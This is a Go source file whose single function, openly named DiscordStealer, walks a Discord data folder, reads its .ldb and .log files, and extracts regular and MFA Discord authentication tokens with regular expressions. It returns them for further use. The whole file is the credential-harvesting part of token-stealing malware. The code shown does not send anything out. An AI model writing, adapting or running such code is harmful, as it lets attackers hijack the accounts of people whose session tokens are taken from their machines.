package core

import (
	"io/ioutil"
	"os"
	"path/filepath"
	"regexp"
)

type DiscordTokens struct {
	Token string `json:"token"`
	MFA   bool   `json:"mfa"`
}

func DiscordStealer(DiscordFolder string) []DiscordTokens {
	var finalTokens []DiscordTokens
	var discordFiles []string
	var discordTokens []string
	var discordTokensMfa []string
	filepath.Walk(DiscordFolder, func(path string, info os.FileInfo, _ error) error {

		if !info.IsDir() && filepath.Ext(path) == ".ldb" {
			discordFiles = append(discordFiles, path)
		}
		if !info.IsDir() && filepath.Ext(path) == ".log" {
			discordFiles = append(discordFiles, path)
		}
		return nil
	})
	r, _ := regexp.Compile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`)
	rMfa, _ := regexp.Compile(`mfa\.[\w-]{84}`)
	for i := 0; i < len(discordFiles); i++ {
		discordContents, _ := ioutil.ReadFile(discordFiles[i])
		discordTokens = append(discordTokens, r.FindString(string(discordContents)))
		discordTokensMfa = append(discordTokensMfa, rMfa.FindString(string(discordContents)))
	}
	for i := 0; i < len(discordTokens); i++ {
		if len(discordTokens[i]) > 0 {
			finalTokens = append(finalTokens, DiscordTokens{
				Token: discordTokens[i],
				MFA:   false,
			})
		}
	}
	for i := 0; i < len(discordTokensMfa); i++ {
		if len(discordTokensMfa[i]) > 0 {
			finalTokens = append(finalTokens, DiscordTokens{
				Token: discordTokensMfa[i],
				MFA:   true,
			})
		}
	}
	return finalTokens
}
